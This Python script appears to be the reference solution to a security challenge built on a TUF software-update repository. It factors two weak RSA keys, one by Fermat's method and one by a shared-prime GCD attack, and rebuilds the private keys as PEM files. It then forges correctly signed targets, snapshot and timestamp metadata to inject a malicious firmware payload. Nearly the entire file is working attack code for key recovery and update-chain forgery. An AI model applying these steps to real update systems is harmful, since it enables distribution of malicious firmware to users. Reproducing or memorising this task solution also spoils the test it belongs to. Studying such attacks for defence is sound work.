#!/usr/bin/env python3
"""
Solution: Crack two RSA keys with different cryptographic weaknesses in a
multi-key TUF repository, produce valid PEM private key files, and forge
correctly-signed metadata to inject a malicious firmware target.

Key T (targets/snapshot): consecutive primes -> Fermat factoring
Key S (timestamp): shares a prime factor with Key T -> GCD attack

Public keys use different PEM formats:
  Key T: SubjectPublicKeyInfo (BEGIN PUBLIC KEY)
  Key S: PKCS#1 RSAPublicKey (BEGIN RSA PUBLIC KEY)
"""


import json
import hashlib
import os
import math
import shutil
import base64
import subprocess


# ======================== Utilities ========================

def canonical_json(obj):
    return json.dumps(obj, sort_keys=True, separators=(",", ":")).encode("utf-8")


def sha256_hex(data):
    if isinstance(data, str):
        data = data.encode("utf-8")
    return hashlib.sha256(data).hexdigest()


# ======================== DER Parsing ========================

def parse_der_tag_length(data, offset):
    tag = data[offset]
    offset += 1
    length = data[offset]
    offset += 1
    if length & 0x80:
        num_bytes = length & 0x7F
        length = int.from_bytes(data[offset:offset + num_bytes], "big")
        offset += num_bytes
    return tag, length, offset


def extract_spki_pubkey(pem_str):
    """Extract (n, e) from SubjectPublicKeyInfo PEM (BEGIN PUBLIC KEY)."""
    lines = pem_str.strip().split("\n")
    b64 = "".join(l for l in lines if not l.startswith("-----"))
    der = base64.b64decode(b64)

    # Outer SEQUENCE
    tag, length, offset = parse_der_tag_length(der, 0)
    # AlgorithmIdentifier SEQUENCE - skip
    tag, alg_len, alg_start = parse_der_tag_length(der, offset)
    offset = alg_start + alg_len
    # BIT STRING
    tag, bs_len, offset = parse_der_tag_length(der, offset)
    offset += 1  # skip unused-bits byte
    # RSAPublicKey SEQUENCE
    tag, length, offset = parse_der_tag_length(der, offset)
    # INTEGER n
    tag, n_len, offset = parse_der_tag_length(der, offset)
    n = int.from_bytes(der[offset:offset + n_len], "big")
    offset += n_len
    # INTEGER e
    tag, e_len, offset = parse_der_tag_length(der, offset)
    e = int.from_bytes(der[offset:offset + e_len], "big")
    return n, e


def extract_pkcs1_pubkey(pem_str):
    """Extract (n, e) from PKCS#1 RSAPublicKey PEM (BEGIN RSA PUBLIC KEY)."""
    lines = pem_str.strip().split("\n")
    b64 = "".join(l for l in lines if not l.startswith("-----"))
    der = base64.b64decode(b64)

    # SEQUENCE
    tag, length, offset = parse_der_tag_length(der, 0)
    # INTEGER n
    tag, n_len, offset = parse_der_tag_length(der, offset)
    n = int.from_bytes(der[offset:offset + n_len], "big")
    offset += n_len
    # INTEGER e
    tag, e_len, offset = parse_der_tag_length(der, offset)
    e = int.from_bytes(der[offset:offset + e_len], "big")
    return n, e


def extract_pubkey_auto(pem_str):
    """Auto-detect PEM format and extract (n, e)."""
    if "BEGIN RSA PUBLIC KEY" in pem_str:
        return extract_pkcs1_pubkey(pem_str)
    else:
        return extract_spki_pubkey(pem_str)


# ======================== DER Encoding ========================

def int_to_bytes_unsigned(n):
    if n == 0:
        return b'\x00'
    length = (n.bit_length() + 7) // 8
    return n.to_bytes(length, 'big')


def encode_der_length(length):
    if length < 0x80:
        return bytes([length])
    elif length < 0x100:
        return b'\x81' + bytes([length])
    elif length < 0x10000:
        return b'\x82' + length.to_bytes(2, 'big')
    else:
        return b'\x83' + length.to_bytes(3, 'big')


def encode_der_integer(value):
    b = int_to_bytes_unsigned(value)
    if b[0] & 0x80:
        b = b'\x00' + b
    return b'\x02' + encode_der_length(len(b)) + b


def encode_der_sequence(contents):
    return b'\x30' + encode_der_length(len(contents)) + contents


def to_pem(der_bytes, label):
    b64 = base64.b64encode(der_bytes).decode('ascii')
    lines = [b64[i:i + 64] for i in range(0, len(b64), 64)]
    return '-----BEGIN ' + label + '-----\n' + '\n'.join(lines) + '\n-----END ' + label + '-----'


def write_pkcs1_private_key_pem(filepath, n, e, d, p, q):
    """Encode RSA private key as PKCS#1 RSAPrivateKey PEM."""
    # CRT parameters
    dmp1 = d % (p - 1)
    dmq1 = d % (q - 1)
    iqmp = pow(q, -1, p)

    der = encode_der_sequence(
        encode_der_integer(0) +       # version
        encode_der_integer(n) +       # modulus
        encode_der_integer(e) +       # publicExponent
        encode_der_integer(d) +       # privateExponent
        encode_der_integer(p) +       # prime1
        encode_der_integer(q) +       # prime2
        encode_der_integer(dmp1) +    # exponent1
        encode_der_integer(dmq1) +    # exponent2
        encode_der_integer(iqmp)      # coefficient
    )

    pem = to_pem(der, "RSA PRIVATE KEY")
    with open(filepath, "w") as f:
        f.write(pem + "\n")


# ======================== RSA Factoring ========================

def fermat_factor(n):
    """Factor n when p and q are close (consecutive primes)."""
    a = math.isqrt(n)
    if a * a == n:
        return a, a
    a += 1
    for i in range(1_000_000):
        b2 = a * a - n
        b = math.isqrt(b2)
        if b * b == b2:
            p = a - b
            q = a + b
            if p > 1 and q > 1 and p * q == n:
                print(f"  Fermat factoring succeeded in {i + 1} iteration(s)")
                return min(p, q), max(p, q)
        a += 1
    raise ValueError("Fermat factoring failed")


# ======================== RSA Signing ========================

def rsa_sign_pkcs1v15_sha256(message, n, d):
    """RSASSA-PKCS1-v1_5 SHA-256 signature."""
    h = hashlib.sha256(message).digest()
    digest_info = (
        b"\x30\x31\x30\x0d\x06\x09\x60\x86\x48\x01"
        b"\x65\x03\x04\x02\x01\x05\x00\x04\x20"
    ) + h
    k = (n.bit_length() + 7) // 8
    ps_len = k - len(digest_info) - 3
    assert ps_len >= 8
    em = b"\x00\x01" + b"\xff" * ps_len + b"\x00" + digest_info
    m_int = int.from_bytes(em, "big")
    s_int = pow(m_int, d, n)
    return s_int.to_bytes(k, "big").hex()


# ======================== Main ========================

def main():
    repo_dir = "/app/repository"
    forged_dir = "/app/forged_repo"
    keys_dir = "/app/recovered_keys"
    payload_path = "/app/payload.bin"

    os.makedirs(f"{forged_dir}/targets", exist_ok=True)
    os.makedirs(keys_dir, exist_ok=True)

    # --- Step 1: Analyze root.json key architecture ---
    print("=== Step 1: Analyzing TUF key architecture ===")
    with open(f"{repo_dir}/root.json") as f:
        root_meta = json.load(f)

    roles = root_meta["signed"]["roles"]
    keys = root_meta["signed"]["keys"]

    targets_keyid = roles["targets"]["keyids"][0]
    snapshot_keyid = roles["snapshot"]["keyids"][0]
    timestamp_keyid = roles["timestamp"]["keyids"][0]

    print(f"  Targets key:   {targets_keyid[:16]}...")
    print(f"  Snapshot key:  {snapshot_keyid[:16]}...")
    print(f"  Timestamp key: {timestamp_keyid[:16]}...")
    print(f"  Targets == Snapshot: {targets_keyid == snapshot_keyid}")
    print(f"  Targets == Timestamp: {targets_keyid == timestamp_keyid}")

    # --- Step 2: Extract public keys (handling different PEM formats) ---
    print("\n=== Step 2: Extracting public keys ===")
    key_T_pem = keys[targets_keyid]["keyval"]["public"]
    key_S_pem = keys[timestamp_keyid]["keyval"]["public"]

    # Detect formats
    if "BEGIN RSA PUBLIC KEY" in key_T_pem:
        print("  Key T format: PKCS#1 RSAPublicKey")
    else:
        print("  Key T format: SubjectPublicKeyInfo")
    if "BEGIN RSA PUBLIC KEY" in key_S_pem:
        print("  Key S format: PKCS#1 RSAPublicKey")
    else:
        print("  Key S format: SubjectPublicKeyInfo")

    n_T, e_T = extract_pubkey_auto(key_T_pem)
    n_S, e_S = extract_pubkey_auto(key_S_pem)

    print(f"  Key T modulus: {n_T.bit_length()} bits, e={e_T}")
    print(f"  Key S modulus: {n_S.bit_length()} bits, e={e_S}")

    # --- Step 3: Factor Key T via Fermat's method ---
    print("\n=== Step 3: Factoring Key T (Fermat's method) ===")
    p_T, q_T = fermat_factor(n_T)
    print(f"  p: {p_T.bit_length()} bits")
    print(f"  q: {q_T.bit_length()} bits")
    print(f"  Gap (q - p): {q_T - p_T}")
    assert p_T * q_T == n_T

    phi_T = (p_T - 1) * (q_T - 1)
    d_T = pow(e_T, -1, phi_T)

    # --- Step 4: Factor Key S via GCD attack ---
    print("\n=== Step 4: Factoring Key S (GCD attack) ===")
    shared = math.gcd(n_T, n_S)
    assert shared > 1, "GCD attack failed - no shared factor"
    print(f"  Shared factor: {shared.bit_length()} bits")

    p_S = shared
    r_S = n_S // p_S
    assert p_S * r_S == n_S, "Factor verification failed"

    phi_S = (p_S - 1) * (r_S - 1)
    d_S = pow(e_S, -1, phi_S)
    print("  Key S factored successfully via shared prime")

    # --- Step 5: Write PEM private keys ---
    print("\n=== Step 5: Writing PEM private keys ===")
    write_pkcs1_private_key_pem(f"{keys_dir}/targets_key.pem",
                                 n_T, e_T, d_T, p_T, q_T)
    write_pkcs1_private_key_pem(f"{keys_dir}/timestamp_key.pem",
                                 n_S, e_S, d_S, p_S, r_S)

    # Verify with openssl
    for name in ["targets_key.pem", "timestamp_key.pem"]:
        result = subprocess.run(
            ["openssl", "rsa", "-in", f"{keys_dir}/{name}", "-check", "-noout"],
            capture_output=True, text=True
        )
        assert result.returncode == 0, \
            f"openssl check failed for {name}: {result.stderr}"
        print(f"  {name}: {result.stdout.strip()}")

    # --- Step 6: Build forged repository ---
    print("\n=== Step 6: Building forged repository ===")

    # Copy root.json unchanged
    shutil.copy2(f"{repo_dir}/root.json", f"{forged_dir}/root.json")
    if os.path.exists(f"{repo_dir}/1.root.json"):
        shutil.copy2(f"{repo_dir}/1.root.json", f"{forged_dir}/1.root.json")

    # Copy existing target files
    with open(f"{repo_dir}/targets.json") as f:
        old_targets_meta = json.load(f)
    for target_name in old_targets_meta["signed"]["targets"]:
        src = f"{repo_dir}/targets/{target_name}"
        if os.path.exists(src):
            shutil.copy2(src, f"{forged_dir}/targets/{target_name}")

    # Copy payload as new target
    shutil.copy2(payload_path, f"{forged_dir}/targets/firmware_v2.0.bin")
    with open(payload_path, "rb") as f:
        payload_data = f.read()

    # --- Step 7: Forge targets.json (signed by Key T) ---
    print("\n=== Step 7: Forging targets.json ===")
    new_targets = dict(old_targets_meta["signed"]["targets"])
    new_targets["firmware_v2.0.bin"] = {
        "length": len(payload_data),
        "hashes": {"sha256": sha256_hex(payload_data)}
    }
    old_targets_version = old_targets_meta["signed"]["version"]
    new_targets_version = old_targets_version + 1

    targets_signed = {
        "_type": "targets",
        "spec_version": "1.0.31",
        "version": new_targets_version,
        "expires": "2030-12-31T23:59:59Z",
        "targets": new_targets
    }
    targets_sig = rsa_sign_pkcs1v15_sha256(
        canonical_json(targets_signed), n_T, d_T)
    targets_metadata = {
        "signed": targets_signed,
        "signatures": [{"keyid": targets_keyid, "sig": targets_sig}]
    }
    with open(f"{forged_dir}/targets.json", "w") as f:
        json.dump(targets_metadata, f, indent=2)
    print(f"  Version: {old_targets_version} -> {new_targets_version}")
    print(f"  Signed by Key T ({targets_keyid[:16]}...)")

    # --- Step 8: Forge snapshot.json (signed by Key T) ---
    print("\n=== Step 8: Forging snapshot.json ===")
    with open(f"{repo_dir}/snapshot.json") as f:
        old_snapshot_meta = json.load(f)
    old_snapshot_version = old_snapshot_meta["signed"]["version"]
    new_snapshot_version = old_snapshot_version + 1

    snapshot_signed = {
        "_type": "snapshot",
        "spec_version": "1.0.31",
        "version": new_snapshot_version,
        "expires": "2030-12-31T23:59:59Z",
        "meta": {
            "targets.json": {"version": new_targets_version}
        }
    }
    snapshot_sig = rsa_sign_pkcs1v15_sha256(
        canonical_json(snapshot_signed), n_T, d_T)
    snapshot_metadata = {
        "signed": snapshot_signed,
        "signatures": [{"keyid": snapshot_keyid, "sig": snapshot_sig}]
    }
    with open(f"{forged_dir}/snapshot.json", "w") as f:
        json.dump(snapshot_metadata, f, indent=2)
    print(f"  Version: {old_snapshot_version} -> {new_snapshot_version}")
    print(f"  Signed by Key T ({snapshot_keyid[:16]}...)")

    # --- Step 9: Forge timestamp.json (signed by Key S — different key!) ---
    print("\n=== Step 9: Forging timestamp.json ===")
    with open(f"{repo_dir}/timestamp.json") as f:
        old_timestamp_meta = json.load(f)
    old_timestamp_version = old_timestamp_meta["signed"]["version"]
    new_timestamp_version = old_timestamp_version + 1

    snapshot_bytes = json.dumps(snapshot_metadata, indent=2).encode()
    timestamp_signed = {
        "_type": "timestamp",
        "spec_version": "1.0.31",
        "version": new_timestamp_version,
        "expires": "2030-12-31T23:59:59Z",
        "meta": {
            "snapshot.json": {
                "version": new_snapshot_version,
                "length": len(snapshot_bytes),
                "hashes": {"sha256": sha256_hex(snapshot_bytes)}
            }
        }
    }
    timestamp_sig = rsa_sign_pkcs1v15_sha256(
        canonical_json(timestamp_signed), n_S, d_S)
    timestamp_metadata = {
        "signed": timestamp_signed,
        "signatures": [{"keyid": timestamp_keyid, "sig": timestamp_sig}]
    }
    with open(f"{forged_dir}/timestamp.json", "w") as f:
        json.dump(timestamp_metadata, f, indent=2)
    print(f"  Version: {old_timestamp_version} -> {new_timestamp_version}")
    print(f"  Signed by Key S ({timestamp_keyid[:16]}...)")

    # --- Done ---
    print("\n=== Forged repository created successfully ===")
    print(f"Keys: {keys_dir}/")
    print(f"Repo: {forged_dir}/")
    for entry in sorted(os.listdir(forged_dir)):
        full = os.path.join(forged_dir, entry)
        if os.path.isdir(full):
            for sub in sorted(os.listdir(full)):
                print(f"  {entry}/{sub}")
        else:
            print(f"  {entry}")


if __name__ == "__main__":
    main()
